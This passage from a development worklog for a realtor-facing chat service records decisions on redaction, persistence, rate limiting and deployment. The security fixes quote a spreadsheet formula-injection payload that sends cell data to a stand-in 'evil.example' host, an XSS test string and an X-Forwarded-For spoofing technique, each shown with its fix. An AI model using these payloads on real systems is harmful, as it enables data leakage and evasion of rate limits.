`/doctor` are limited by IP instead: the first is unauthenticated and proxies
passwords to the portal's own lockout, and the second deliberately answers
callers whose token did not verify.

**A per-user concurrency cap was considered and dropped.** Sixty simultaneous
streams trip the hourly window on the same second, so it would buy nothing for
the state it costs.

**Audit goes to stdout, not a table.** architecture.md §2 scoped an `audit`
table alongside conversations and feedback. Rejected: it is a second write on
the answer path, and it trades Railway's retention for a retention problem of
our own. The line is emitted in the `finally` that already exists, so a
cancelled request still leaves one — with `status:"incomplete"`, which is the
honest word for it, because cancellation raises past every `except Exception`.

**The question is logged and the answer never is.** A question is
realtor-authored and cannot contain sheet data. An answer in Realtor Mode can
quote commission. This is the rule feedback.py already stated, applied to the
bigger surface, and it is why an audit *table* would not have helped either.

**The audit line reads the event stream, like persistence does.** Tool names,
their result counts and the token usage all pass through `chat.py` already, so
`agent_pydantic.py` is untouched for the second phase running. Reaching into the
adapter for the same numbers would couple the route to the agent framework.

**`owns()` became `meta()`.** Once the write path needed the stored mode as well
as ownership (AUR-57), keeping a boolean beside it meant two queries for one
answer. `meta()` returns the head row or `None`, and `None` still means both
"not yours" and "never existed" at once, which was the point of `owns()`.

**Reopening a thread sets the mode; it does not read it for redaction.**
`body.mode` still selects the `Viewer`, because mode is what is on the screen
right now — a realtor holding the phone toward a buyer is in Client Mode
whatever the thread was. What the stored mode does is repaint the header before
a single turn renders, so nobody watches a client conversation come back blue
and switch a moment later. A thread continued in a different mode updates its
row, or the list badges it wrongly.

**`history()` now returns the message id and `created_at`.** Not for the model —
`turns_from` still builds `Turn(role, content)` and nothing else — but
`auraFeedbackRow` refuses to offer a vote it cannot attribute, so without an id
every reopened answer silently lost its thumbs. Found by opening a seeded thread
and counting buttons, not by reading the code.

**`#auraNew` became the chats button, and New Chat moved inside the panel.** The
header had four controls and a fifth is crowded at 375px. The panel lives inside
`#aura` rather than on a route, because the router's only chat hook is
`closeChat()` — a routed panel would have closed the chat in order to show the
list of chats.

**A reopened answer shows text and no cards.** The store keeps the ids and names
an answer used, never the project records — architecture.md forbids a second
copy. Rebuilding cards from those ids would be fine for 145 projects and would
show a *different project's price* for the 16 that share a slug
(known-issues 5). Cards come back when `PROJECT ID` is filled.

**AUR-62 is a screen plus a CSV, and the gate is server-side.** The PWA throws
the role away at login and now asks Aura's `/me` instead of starting to store
one — a role in `localStorage` is a role somebody can edit. The client flag only
decides whether to draw the nav row; `claims.is_admin` on `/feedback` decides
whether the data exists.

**Report timestamps render relative, not raw.** `created_at` is UTC out of
Postgres, so printing it verbatim dated every report four hours into a Toronto
reader's future. Caught on screen, not in a test.

**The fully-local dev stack cannot hold a session, and now says so.**
`dev/authshim.mjs` answers `login` and `session` locally while every other action
proxies to the live deployment, which has never seen a dev token — so the first
data screen returns `login required` and `isAuthErr` signs you out a second after
you sign in. Confirmed against a stashed tree that it predates this work. It is
fine for the chat, the panel and the reports screen; anything touching portal
data needs a real Portal ID. Written into operations.md §3 rather than
rediscovered.

**A stale Client header survived a sign-out, and that is the dangerous
direction.** `forgetData()` reset `AURA_MODE` to realtor and never repainted, so
on a shared phone the next realtor signed in to an ochre "Client mode" header
while the mode was actually realtor -- they would turn the screen toward a buyer
believing the safe mode was on, with commission still reaching it. Pre-existing,
not introduced here, and found by reloading the page during the mode work rather
than by reading the code. One line, plus the check that fails without it.

### The benchmark fell to 39/50, and the cause was casing

**A category only matched if the model happened to send it lowercase.** The
portal emits `townhome` / `detached` / `semi` / `condo` in lowercase and always
has -- `catsFromType_` in Core.js lowercases before it buckets. `matches()`
compared with an exact set intersection, so the day the model started sending
`"Townhome"` every type-filtered search returned nothing and Aura said it could
not confirm any townhomes in a city holding twenty-one projects. Five probes in
a row sent the capital T, so this was not a flake to wait out.

Folded at the `ProjectFilters` boundary rather than inside `matches`, so a future
SQL adapter inherits it; `matches` lowercases the project side too. Note the
neighbouring lines already normalised `city.upper()`, `builder.lower()`,
`status.lower()` -- categories were the one field that did not, which is why it
read as correct for so long.

Nothing in the tool schema constrains that argument and nothing in the prompt
asks for lowercase, so the old behaviour was never a contract -- it was a coin
that had been landing the same way. 39/50 -> 43/50 with the fix.

### Deploying stopped depending on remembering a flag

`railway up` uploads the git repository root, not the working directory, so a
plain deploy shipped the Apps Script portal and Railpack found no Python app.
DEPLOY.md had documented the `--path-as-root` workaround; it was forgotten
twice, which is the definition of a workaround that does not work.

The service's Root Directory is now `/aura-chat`, `railway.json` pins the
builder and start command, and `scripts/deploy.sh` is the one command. The two
cannot be combined -- with Root Directory set, the flag makes Railway look for
`aura-chat/aura-chat` -- so DEPLOY.md now says so in the imperative.

`rootDirectory` cannot live in `railway.json`, because Railway reads that file
*from* the root directory. It is a service setting; the runbook records how to
check it.

**The deploy script verifies the build is actually serving.** A dashboard
Redeploy re-runs the *previous image* and reports success, which is how an hour
went into diagnosing a "deployed" service that was still running the old code.
The script fails if the response carries no `X-Request-Id`.

### Five from the review of this change, all reproduced before being fixed

**The CSV export wrote realtor text as live spreadsheet formulas.** A note of
`=HYPERLINK("https://evil.example/?x"&A1,"click")` came back out of
`/feedback.csv` unchanged, and this file exists to be pasted into Sheets — so
the reviewer gets a clickable link whose URL carries the neighbouring cell, and
`=IMPORTXML` needs no click at all. Every cell that would lead with `=+-@` now
gets a single quote, which spreadsheets consume on display.

**The IP ceilings were keyed on a header the caller writes.** `client_ip` took
the *first* `X-Forwarded-For` entry. Measured against a ceiling of three: six
requests from one address gave three 429s, and twenty with a rotated header gave
none. Railway appends the real peer, so the last entry is ours and the first is
the caller's — it now reads the last. That assumes exactly one trusted hop,
which is written into operations.md, because with the container exposed directly
the whole header is caller-controlled again.

**`MAX_KEYS` bounded nothing.** `_prune` only dropped expired entries, so during
a burst of distinct live callers there was nothing expired to drop and the map
grew past the cap unchecked — 15,000 keys against a stated 10,000, proven.
`auth_portal_hmac` already had the oldest-first eviction this was missing; it now
does too. Evicting forgives a request, never refuses one, so it is always safe.

**`Retry-After` was not exposed, so the message it feeds never appeared.**
Cross-origin JS sees only the CORS safelist. The page could read exactly
`content-length, content-type, x-request-id`, so `r.headers.get('Retry-After')`
was null every time and the "try again in about N minutes" branch was dead code —
a realtor refused for the next hour was told "in a moment", every time. Also a
lesson about the check that guarded it: `dev/verify.mjs` asserted the wait "is
what the realtor is told", and that had never been true.

**A failed `set_mode` cost the whole conversation.** AUR-57 put the first *write*
on a path that had only ever read. Any error there escaped into the handler that
turns store failures into `cid = None`, so `start` carried a null
conversation_id, the client dropped the id it held, and the next question opened
a second thread with none of the context — from a transient lock wait. It is
guarded on its own now: a stale `mode` column costs one wrong badge in a list,
which is the cheaper failure by a wide margin.

**The `history` fallback was unreachable, and the worklog said otherwise.**
`_history` returned the stored turns unconditionally, but a conversation created
one line earlier is empty -- so with a store wired, `body.history` was dead code.
An un-updated phone, which never sends a `conversation_id`, got a fresh
conversation and zero context per question and a junk row each time; and after a
store blip the shipped client kept a thread on screen the model could not see,
because it had cleared `AURA_CID` but not its turns. `or body.history` restores
the documented behaviour: the store wins when it has anything, the phone's
assertion is honoured only for a thread the server has nothing for.

**One of these fixes broke one of my own tests, and the test was the thing that
was wrong.** `test_the_forwarded_address_wins_over_the_proxy` asserted the first
XFF entry wins — it pinned the bug. Rewritten to say the opposite and to say why.
The route-level version also had to model the proxy appending, because without
one in front the header is fully caller-controlled either way, and a test that
ignored that would have "proved" a fix that does not hold.

**Two of this change's own checks were vacuous and were caught.** `dev/verify.mjs`
matched the first line mentioning `403`, which was the comment above the code,
so it passed for any implementation; and an `indexOf < indexOf` ordering check is
true when the first term is absent. Both now fail when the thing they guard is
broken, proved by breaking it. This is the second time the same trap has been
hit — a check that has never been seen to fail has not been seen to work.

---

## 2026-08-25 — Phase 4a: the service gets a memory

**What.** AUR-36, 37, 39, 40, 88 and the storage half of 61. Conversations,
messages and feedback in Postgres; history moves from the client asserting what
was said to the server knowing. The 4b surfaces — history panel, admin browser —
are deliberately not in this.

**Railway Postgres, not the Supabase the architecture doc names.** Same platform
as the service, so it connects over Railway's private network and is never
publicly reachable, and there is no cold start. architecture.md listed
"Supabase free tier pauses after ~7 days idle" as a known risk against itself;
this removes it rather than mitigating it. Cost: pgvector for Phase 5 needs
installing rather than being present.

**`schema.sql` at startup, no Alembic.** Three tables in a sprint did not justify
a dependency and a generate-then-review step. The cost is real and will be felt
later: no rollback, and every future change is hand-written. Adopting Alembic
later is easy; removing it would not be.

**Storage was measured, not assumed.** Mean question 37 bytes, mean answer 170,
across the 50-question benchmark. Twenty realtors at five conversations a day is
~30 MB/year against a tier that holds 500 MB. The instinct that transcripts grow
fast is right for embeddings and images and wrong for terse text.

**`sources` is the reason this phase exists.** Follow-ups were failing because
history reaches the model as prose: it knew a previous answer named "Ivy Rogue
and New Kleinburg" and had no idea what their ids were, so asked to compare them
it invented `oakville-townhomes-1`. `ai_messages.sources` stores the ids and
names an answer was built from, and `domain.conversation.turns_from` appends them
as one line when rebuilding history. Names travel with the ids because the model
matches on what it wrote, not on an id it never saw.

**Persistence observes the event stream; the agent adapter is untouched.**
`chat.py` already relays every event, so it accumulates the answer from `text`
events and the ids from `projects` and writes one row at the end. The
alternative — reaching into `Deps.collected` — would have coupled the route to
the agent framework for no gain.

**The assistant turn is written in a `finally`.** A realtor who taps Stop, or a
phone that loses signal, reopens the thread to a half answer rather than a
question with nothing under it.

**Persistence is the feature that degrades.** A database that is down costs
history, never the answer: `chat.py` falls back to the client's own turns and
logs a warning, `/conversations` answers 503 rather than 500, and feedback still
reaches the log line. `/health` stays up throughout — that behaviour was already
pinned by `BrokenStore` / `ExplodingStore` in test_health.py, written phases ago.

**Two integration scripts, deliberately not pytest.** `scripts/check_store.py`
and `scripts/check_chat_persistence.py` need a real database and are run by hand.
A test that silently skips when Postgres is absent is a test nobody notices has
stopped running, and the suite's "never touches the network" rule is worth more
than the coverage. They caught two things the fakes could not: `FakeAuthVerifier`
answers the same user for any token, so an isolation check written as a token
swap proves nothing — the row has to genuinely belong to somebody else. And the
first versions used fixed user names, so a re-run failed against correct code;
both now mint unique users per run.

**`history` in the request body is kept, for now.** Honoured only when there is
no `conversation_id`, so a phone that has not updated keeps working. The client
sends `[]` once the server owns the thread. Remove the field when the rollout
completes.

**`rename` was planned onto the port and dropped.** Titles derive from the first
question, so nothing would have called it.

---

## 2026-08-25 — Review of the feedback change: six fixes, two that mattered

**What.** A review of the change above, on the code written the same day. Six
findings, all fixed. Four are worth recording.

**A capped list is not a capped field.** `project_ids` had
`Field(max_length=MAX_PROJECT_IDS)`, which bounds how *many* ids arrive and says
nothing about how long each is. Twelve ids of 200kB each is a valid body, and it
produced a **2.3MB single log line behind a 200**. Every neighbouring field was
capped and the docstring claimed the whole model was bounded, which is how it
went unnoticed. It matters more than an oversized line usually would: until
Phase 4 that log **is** the storage, so one request can push other realtors'
reports out of a bounded retention window. Fixed with an `Annotated[str,
StringConstraints]` item type. The lesson generalises — every list field in this
service needs both bounds.

**A data issue is not a thumbs-down.** Both exits from the category sheet
hardcoded `verdict:'down'`, so reporting a stale price through its own button
filed a negative vote the realtor never cast. AUR-59 measures whether the
*answer* was good; AUR-60 reports whether the *sheet* is current, and a
well-written, well-sourced answer can quote a price the sheet got wrong. Filing
every AUR-60 report as an AUR-59 downvote would have made the helpfulness metric
untrustworthy from the first week, and unrecoverably so — the two are
indistinguishable once written. `verdict` is now nullable, `sheet(verdict)`
files what it was opened with, and a `model_validator` refuses a report carrying
neither verdict, category nor note, because optional on both does not mean
optional on neither.

**Skip discarded the note.** It sat directly under the note field, read as "skip
the category", and sent `''`. That is the only free text a realtor can send, and
it is worth most in exactly the case where none of the seven categories fitted.
Skip now carries the note; a note alone enables Send; and on the report path,
where there is no vote to preserve, the button cancels and says "Cancel" rather
than filing something.

**A comment that was wrong is worse than no comment.** The feedback buttons were
36px under a comment asserting they were "comfortably over the 44px tap target
once the row's own gap is counted" — 36+6 is 42, and a flex gap is not tappable.
Two 36px thumbs 6px apart, and a mis-tap is unretractable: the verdict posts and
the row settles to "Thanks" with no undo. Now 44x44, matching the five other
places in this stylesheet that already use 2.75rem.

**Two checks that could not fail.** The cap check grepped for the literals `500`
and `200` while its message claimed parity with the server, so tightening
`MAX_QUESTION` would have left the client posting into a 422 with the check
green; it now reads both constants out of `feedback.py`. And the new
mode-flip ordering check used `indexOf(a) < indexOf(b)`, which is true when `a`
is absent — it passed on the reverted code. Both were caught by deliberately
breaking the thing each claimed to protect and confirming the check went red.
Worth doing for every check that guards something expensive.

---

## 2026-08-25 — Cards finished, feedback shipped without a database

**What.** AUR-46 (deposit and incentive on the card) and AUR-59/AUR-60 plus the
backend half of AUR-61 (thumbs and a data-issue report). Compare-by-name was
looked at, understood and deliberately not fixed.

**Deposit and incentives are visible to a buyer, and that is the requirement.**
The natural instinct is to hide anything commercial in Client Mode, so it is
worth recording that AUR-55 enumerates what Client Mode strips — commission,
internal commission, internal remarks, allocation info, agent notes, admin
notes, lead/client notes, confidential strategy, private builder information —
and a deposit structure is on none of those lists. It is what the buyer is
quoted, and "Best Incentives" is one of the four starter prompts. A test asserts
they survive Client Mode, so reversing this has to be a decision rather than an
accident.

**The payload spells them the sheet's way.** `depositpct`, `depositsched`,
`incentives` — `getCity_` in Sheets.js, not `deposit_pct` on the domain model.
That is the entire point of `_for_client` existing beside `_for_model`: one
`projectCard()` renders a city row and a chat result, and a domain-style key
would need a translation layer that does not exist. The percentage arrives as a
number from here and as text from the portal, so `pct()` formats whichever it is
given and passes anything that is not a bare number through unchanged — a cell
holding "$50k then 5% at closing" must not be rewritten into "50%".

**`last_updated` reaches the client and is deliberately not rendered.** It was in
the plan and came out. Ten of the 23 dated projects are read wrong today (the
sheet is month-first, the parser tries day-first — known-issues 1), so a "records
updated" line would be a confident wrong date on nearly half of them. Same
reasoning that keeps "What changed this week?" out of the starter prompts. Render
it in the change that fixes the parser.

**Feedback stores the question and the verdict, and not the answer.** The first
shape had the answer in the payload so the reviewer could see what Aura said. It
came out: in Realtor Mode an answer can quote commission and internal notes, and
until Phase 4 the store is a log line on a hosting platform — not a place that
data has been agreed to live. The cost is real and worth naming: a bare thumbs-
down now tells Sudhanshu a question was answered badly but not how, and only the
categorised reports are actionable alone. Phase 4 recovers it for nothing, since
`ai_messages` will hold the answer and `answer_id` already joins to it.

**`mode` was dropped from the payload after being planned in.** The row does not
render in Client Mode, so the field would have been the constant `"realtor"` on
every row — a column that only ever holds one value teaches a reader something
untrue about what was collected.

**No `record_feedback` on the ConversationStore port.** Tempting, since the port
is already declared for Phase 4. Rejected: the port's shape is not settled,
nothing would call the method, and a `if store is not None` branch around an
adapter that does not exist is an untested seam. Instead `_record()` in
`app/feedback.py` is one function whose body is the whole of what Phase 4
replaces.

**The log line did not appear, and the endpoint still answered 200.** Found by
posting a real report at a locally running uvicorn and finding nothing in the
output. uvicorn configures the `uvicorn*` loggers and nothing else, so `aura.*`
propagated to a handler-less root and `logging.lastResort` dropped it — that
handler only emits WARNING and above. Harmless for most INFO; not harmless when
the log line **is** the storage. `main.configure_logging()` now gives `aura` its
own stdout handler. The regression test asserts through captured stdout rather
than `caplog`, because `caplog` attaches a handler and is exactly what hid this.

**Compare-by-name: understood, extended in known-issues, not fixed.** Two
benchmark failures with two different causes, and the second one was not written
down. Q09 is the documented signature gap. Q35 ("compare the first two") is not:
history carries no ids, so the model invented `oakville-townhomes-1`. A name
resolver cannot fix that — there is no name to resolve. It is Phase 4 work, and
the interim (client sends ids back) was rejected as work Phase 4 deletes. Also
recorded there: the ambiguity everyone reaches for first is not the cause, and
the real ambiguity (issue 5) is same-name-in-the-*same*-city, so carrying the
city forward would not disambiguate it either.

---

## 2026-08-25 — Code review: nine fixes, one of them a Client Mode leak

**What.** A high-effort review of the whole chat changeset. Nine findings, all
fixed. Three are worth recording; the rest were stale comments, a leaked global
and a hardcoded package list.

**`drive_url` had quietly become buyer-visible.** `_for_model` omitted every link
column, so before this changeset no chat card carried a link at all. `_for_client`
carries all three. `broker_url` and `status` are in `CLIENT_HIDDEN` and get blanked
by `RedactingProjectRepo`; `drive_url` was on neither list, so it survived
redaction and `projectCard` rendered a tappable "Drive" button on a screen a
realtor had deliberately turned toward a buyer — straight into the brokerage's own
Drive folder.

Fixed by adding `drive_url` to `CONFIDENTIAL_FIELDS` **and** `CLIENT_HIDDEN`,
rather than by dropping it from the payload: realtors want that link, and the
redaction list is the one place the policy is supposed to live. `website_url`
stays visible for everyone — it is the builder's public site. This is a change to
what Client Mode hides, which AGENTS.md says to ask about; it was made under an
explicit instruction to fix every finding, and it only restores what a buyer
could see before the payload changed. The existing redaction tests caught the
fixture gap immediately, which is what they are for.

**A stream that ended without saying so left the chat bricked.** `auraStream`
resolved silently when the body ended with no `done` or `error` event. Nothing
downstream ran: the caret kept blinking, the send button stayed in its stop
state, and `AURA_ABORT` was never cleared — so the guard at the top of `auraAsk`
silently discarded every later question. The only escape was pressing a button
that read "Stop" while nothing was running. This is exactly what iOS does when a
PWA is backgrounded mid-answer, so it was not hypothetical; it was device-matrix
row 11 waiting to happen. `auraStream` now resolves `true` only if a terminator
actually arrived, and the caller reports a cut-off answer otherwise.

That code had no test, which is why it shipped. It has seven now — including
frames split across three chunks mid-token, a final frame with no trailing blank
line, and the truncation case itself. Mutation-checked: forcing the return to
`true` fails the suite.

**Retry deleted the wrong turn.** The handler called `AURA_TURNS.pop()`, assuming
the failed question was still last. An error bubble stays on screen, so a realtor
who gives up, asks something else, then scrolls back and taps "Try again" popped
the *newer* answer. It now holds a reference to the turn it created and splices
that one out by identity, wherever it has ended up.

**A note on the wheel test.** Verifying the setuptools change with `pip wheel .`
left `build/` and `aura_chat.egg-info/` behind, and ruff walked them — 34 errors
became 56, all of them duplicates of real files. Both are gitignored now.

---

## 2026-08-25 — The chat panel was never actually full height

**What.** Removed `height:100dvh` from `.aura`, fixed the composer's growth
maths, and stopped it showing a scrollbar it had not earned.

**Why the panel had a gap under it.** `.aura` carried both `inset:0` and
`height:100dvh`. `inset:0` already sets top and bottom, which sizes the panel to
its **fixed containing block** — the real visible viewport, on any device, with
no unit that can be wrong. The explicit height then overrode that bottom edge.
On iOS, `dvh` tracks the *dynamic* viewport while a fixed element is laid out
against the *layout* viewport; wherever the two disagree — browser toolbars, or
the home-indicator band under `viewport-fit=cover` — the panel came up short and
its own `--paper` background showed as a strip beneath the white composer.

The `dvh` was belt-and-braces on top of something already correct, and it was the
brace that broke the belt. Deleting it is the whole fix, and it is
device-independent in a way the unit never was. The keyboard is still handled:
`interactive-widget=resizes-content` shrinks the layout viewport, so the
containing block shrinks, so `inset:0` follows.

`dev/verify.mjs` used to **assert** `100dvh` was present. That check encoded the
bug. It now asserts `inset:0` and the *absence* of any explicit height.

**Why the composer always showed a scrollbar.** `auraGrow` set
`height = scrollHeight`. The box is `border-box`, so that height includes the
1px top and bottom border — but `scrollHeight` measures content plus padding and
*excludes* border. A permanent 2px shortfall, so `scrollHeight > clientHeight`
was true even on an empty composer. It only became visible after typing because
iOS and macOS paint overlay scrollbars lazily; the overflow was always there.
Adding the border back fixes it, and `overflow-y` now starts hidden and flips to
`auto` only at the cap, so a scrollbar means "there is more than fits" rather
than "the arithmetic was out". `auraGrow` also runs when the chat opens — left
to the first keystroke, the opening frame kept whatever `rows="1"` produced.

**The testing lesson, which is the real one.** All of this was verified at
375×812 with `env(safe-area-inset-*)` reporting 0 — the single configuration in
which the gap is invisible. The fix took minutes; the reason it shipped was a
sweep that never left one screen size. Re-verified across 320×568, 360×800,
393×852, 430×932, 740×360 landscape and 1024×1366, with device insets simulated,
checking the composer stays flush *while the textarea grows*.

---

## 2026-08-25 — Cards that match the answer, and markdown that renders

**What.** Two defects found on a phone. `inventory_summary` gained a `spotlight`
parameter, and the answer text is now rendered through a small markdown parser
instead of being dropped in as plain text.

**Why `inventory_summary` was showing the wrong cards.** It carded `cheapest`
and `dearest` on *every* call. So "how many projects do we have?" answered "158
across 36 cities" and then showed the realtor DUO Condos and Spring Valley
Estates underneath — two cards under an answer that was not about either of
them. On "the least expensive in Brampton" it was worse: one of the two cards
was the *most* expensive project in the city, directly contradicting the
sentence above it. Two of our four starter prompts hit this, so it was the first
thing a realtor saw.

The exception itself was right and survives: naming the cheapest project is
showing it, and a realtor should get the record with its links rather than a
price in prose. What was wrong is that it had no condition, and — worth noting
because it made the bug invisible — **the docstring already claimed the opposite**
("Returns no project cards"), so the model was being told one thing while the
code did another. `spotlight` defaults to `"none"`, and an unrecognised value
falls back to `"none"` rather than showing everything: a model typo should fail
toward silence, not toward the old behaviour.

**Why the markdown is rendered client-side rather than asked away.** There is no
API flag that makes a model emit or avoid markdown — it is emergent, not a
setting. The only format guarantee OpenAI-compatible APIs offer is structured
output (`response_format: json_schema`), and taking it would mean streaming
partial JSON instead of text deltas, which is the entire UX. So the prompt asks
for plain sentences (it worked — four question types that previously produced
bold and bullets now produce none) and the client renders what leaks through.

**Why a hand-written parser and not a library.** The PWA has no bundler;
`dev/build.mjs` concatenates. `marked` + `DOMPurify` is ~30KB and a build step
for a project that deliberately has neither. More importantly the usual pattern
— render everything, then sanitise the tree — is weaker than what fits here.
`auraMdRender` only ever calls `createElement` for `p`/`ul`/`li`/`strong` and
`createTextNode` for everything else, and **never sets an attribute of any
kind**. There is no code path that produces an `href` or an `src`, so there is
nothing for a sanitiser to strip. `dev/verify.mjs` asserts that directly, and
feeds the parser `<img src=x onerror=...>` to prove it comes back as text.

The parse/render split is what makes it testable: `auraMdParse` is pure, so the
verifier runs it in a VM against a **real captured answer** from the deployed
service rather than a hand-written fixture.

**Two details that only show up in motion.** An unterminated `**` is suppressed
while streaming, so a word arrives unbolded and then bolds instead of flashing
as punctuation. And `auraPaint` had to be rebuilt from nodes as well — when only
the live path rendered markdown, reopening a saved chat showed the asterisks the
fresh answer had just hidden.

**Not fixed.** Compare-by-name (known-issue 4) is still broken: the model sends
names, the tool takes ids, and it works perfectly when given real slugs. And the
structured `summary` component — rendering counts and city tallies from
`InventorySummary` rather than letting the model flatten them into prose — is
still the better answer to what `spotlight` patches over.

---

## 2026-08-25 — The service is deployed, and three build failures worth remembering

**What.** `aura-chat` is live on Railway at
`aura-chat-production-0711.up.railway.app`. Getting there needed a build backend
in `pyproject.toml`, a literal `requirements.txt`, a `.python-version` pin, and a
deploy flag. The how is in [`../aura-chat/DEPLOY.md`](../DEPLOY.md);
this is why those files exist at all, so nobody deletes one as redundant.

**Why the deploy command has a flag that looks optional.** `railway up` archives
from the **git repository root**, not the working directory. This service is a
subdirectory of the portal's repo, so a plain `railway up` ships `Core.js` and
`App.html` to a Python builder, which then reports it "could not determine how to
build the app". `--path-as-root` is what makes `./aura-chat` the archive root.
Do not set the service's Root Directory *as well* — with both, Railway looks for
`aura-chat/aura-chat`.

**Why `pyproject.toml` has a `[build-system]` it never needed locally.** Without
one there is no backend for pip to call, and Railway's builder installs nothing
**without failing**. The build goes green and the container answers every request
with `uvicorn: command not found`. `[tool.setuptools] packages` is spelled out
because auto-discovery refuses a flat layout with `tests/` beside `app/`.

**Why `requirements.txt` duplicates the dependency list.** The obvious
non-duplicating version — a file containing `.` — does not work: the builder
copies `requirements.txt` and runs pip *before* copying the source, so `.` fails
with "package directory 'app' does not exist". The duplicate is forced.
`tests/test_requirements_match.py` fails when the two lists drift, because the
alternative is finding out at container start, on a deploy, as an ImportError.

**A note on diagnosing any of this.** All three failed near-silently:
`railway logs --build` returned two lines, both "scheduling build", and
`railway status` said only "Failed". The real errors were reachable through the
GraphQL API (`buildLogs` / `deploymentLogs`), which is the first place to look,
not the last.

**Verified live.** `/doctor` green end to end — token verified, 162 projects, 87
roll-up rows skipped. And the check the whole design rests on: events off `/chat`
arrived at 2.98s, 5.80s, 7.96s and 8.28s rather than in one lump, so the host
does not buffer. That was the reason Netlify's proxy was rejected, and it needed
proving here rather than assuming.

---

## 2026-08-25 — The chat got a phone screen, and one card renderer replaced two

**What.** Phase 3's last piece: an `#chat` route in the PWA that opens a
full-screen overlay, streams `/chat` over `fetch` + `ReadableStream`, and renders
project cards. Plus CORS on the service, a `_for_client` payload beside
`_for_model`, and `projectCard()` extracted from the two screens that had their
own copy.

**Why an overlay bound to a route, rather than either alone.** The shell scrolls
the document — sticky topbar, fixed tabbar, `.wrap` padding. A chat written into
`#content` fights all three, and on iOS a `position:fixed` composer ends up
*behind* the keyboard, because Safari resizes the visual viewport and leaves the
layout viewport where it was. A bare overlay fixes the layout but has nothing for
Android's back button to bind to. Making `#chat` a real route and having its
loader open a fixed surface gets both: `go()`, `hashchange` and hardware back all
work unchanged, and the chat owns its own viewport. The three things that make it
survive the keyboard are `interactive-widget=resizes-content` in the viewport
meta, a `100dvh` flex column with **nothing fixed inside it**, and
`overscroll-behavior:contain` on the message list. `dev/verify.mjs` asserts all
three, because each is the kind of rule that gets refactored away by someone who
cannot see what it was for.

**Why not `EventSource`.** It is GET-only, so a 2000-character question plus
twenty turns of history would have to travel in a URL that every proxy logs. It
cannot set an `Authorization` header, so the only way to pass the bearer token is
in that same URL. And it reconnects on close without being able to tell a
finished stream from a dropped one, so every answered question would immediately
ask itself again — and bill for it. `fetch` also gives the Stop button an
`AbortController` for free.

**Why CORS is an explicit list and not a proxy.** Two rejected options, so nobody
spends an afternoon rediscovering them. Proxying `/aura/*` through Netlify to
make the service same-origin would have removed CORS entirely, but Netlify's
redirect proxy buffers: SSE arrives as one chunk and long responses 502, which
destroys the only reason we stream. Serving the chat from the Apps Script-hosted
portal is impossible rather than merely hard — its pages come from a
`googleusercontent.com` subdomain whose hash varies, so the origin cannot be
allowlisted, and Apps Script cannot stream at all. So the chat is PWA-only, gated
on a build-time `window.AURA_BASE` that mirrors the existing `window.AK_EXEC`
switch. `allow_credentials` stays False: the token is a bearer header, never a
cookie, so credentialed CORS buys nothing and with it off a wrong entry in the
list cannot hand a third party a live session.

**Why `_for_client` exists at all.** `_for_model` is tuned for a language model:
it drops empty fields and sends `source`, which is empty on all 161 rows, while
omitting `website_url`, `drive_url` and `broker_url` entirely. A card built from
it would carry **no links** — a name and a dead end. `_for_client` emits the
*portal row's* field names rather than the domain model's, which is what lets one
`projectCard()` render a city-screen row and a chat result with no translation
between them.

**Why the Focus pill is keyed on `status` and not `is_focus`.** `status` is in
`CONFIDENTIAL_FIELDS`, so in Client Mode it arrives blank and the pill disappears
without anything asking it to. `is_focus` is not confidential; keying the pill on
it would show a buyer an internal designation. The safe behaviour here is a
consequence of the existing redaction list, not a second rule that could drift
out of step with it — which is the only kind worth having.

**Why the card renderer was extracted now.** Home and city each carried their own
inline copy and had already drifted — different title fallbacks, different
subtitles. The chat would have made three. The risk in sharing a renderer is
silently changing two working screens, so `dev/verify.mjs` keeps both
pre-extraction templates verbatim and diffs them against `projectCard()` across
five row shapes including empty and escaped ones. Mutation-checked: changing one
character of the pill markup fails it.

**Two smaller calls.** Signing out now drops the saved chat thread — it is the
one genuinely personal thing the app stores, and an installed PWA outlives a
browser tab by months. And the "what changed this week?" starter prompt was
removed: dates are month-first in the sheet and parsed day-first, and future
dates count as recent (known-issues 1 and 2), so it is the one suggestion that
reliably answers wrong. Put it back when those are fixed.

**Not done.** No conversation list — that needs `ConversationStore`, which is
Phase 4; V1 keeps one thread in `localStorage`. No per-project route: ten slugs
are shared by 26 projects (known-issue 5), so ids are not safe to route on, and
cards link out instead. The feedback row is not built. And the real-device
matrix in the plan — the iOS keyboard in particular — cannot be run from here;
no emulator reproduces it.

---

## 2026-08-24 — A page now knows how big the set was, and counting got its own tool

**What.** Two changes with one cause. `ProjectRepo.search` returns `SearchPage`
(items + total) instead of a bare list, and a new `inventory_summary` tool
answers counts, city and builder lists, cheapest and dearest over every match
rather than a page of them.

**Why.** `search` capped at 12 and threw `len(hits)` away, so the model could not
tell "12 results" from "12 of 41". It answered anyway. Asked which cities the
brokerage covers it said nine — exactly the cities present in the 12 cards it
was holding. Asked for the cheapest project it named the cheapest of 12. Asked
which projects are focus projects it listed 12, which is the cap, not the list.
Every one of those is a claim about the whole inventory phrased from a sample,
and a realtor has no way to see the sample boundary. The adapter had carried a
comment admitting the gap and saying it would wait for a reason better than
tidiness. Wrong answers are that reason.

`total` alone only makes the answers honest ("12 of 41"), not correct — knowing
41 matched still does not tell you the cheapest of the 41. Hence the second
tool. It returns counts and names, never project records, so a counting question
stops emitting a truncated card list that reads as the whole inventory. The two
share `matches()`, so a summary can never describe a different set from the one
the same filters would search.

**Rejected.** Raising the cap: 161 projects into a prompt, at token cost, for a
card list nobody reads. Also rejected: a prompt rule telling the model not to
generalise from truncated results. That is a request, and the rest of this
service prefers guarantees — the rule is in the prompt too, but as a second
line, not the fix.

**Why a method and not a sixth port.** `summarise` sits on `ProjectRepo`. The cap
of five ports stands. A caller that raised `limit` to count instead would pull
the whole sheet into a prompt, and in SQL this is GROUP BY, not a second read.

**Two things that could have gone wrong and are tested.** `total` is not
recomputed per viewer — what matched does not change with the audience, only
which fields show, and a Client-Mode search reporting different inventory from
a realtor's would be a strange and quiet bug. And `inventory_summary` hands back
two real `Project`s (cheapest, dearest), which is exactly how a redaction policy
grows a hole; they go through the same wrapper as any other card, asserted over
all four role x mode combinations.

**`without_price` is not decoration.** 135 of 157 available projects have no
readable price. Without that number, "the cheapest is DUO Condos" silently means
"cheapest of the 22 that have a price".

---

## 2026-08-24 — The ONTARIO tab is dropped from the index

**What.** `ROLLUP_CITIES` in `projects_exec.py`. Rows whose CITY is ONTARIO
never become a `Project`. 250 rows become 163.

**Why.** ONTARIO is a tab, but it is not a city. It held 87 of the sheet's 250
rows, and 63 of its 84 distinct names already had a row on a real city tab. The
two rows for one project disagree:

| | CALEDON row 6 | ONTARIO row 31 |
|---|---|---|
| builder | Fernbrook / Zancor Homes | Fernbrook/Zancor |
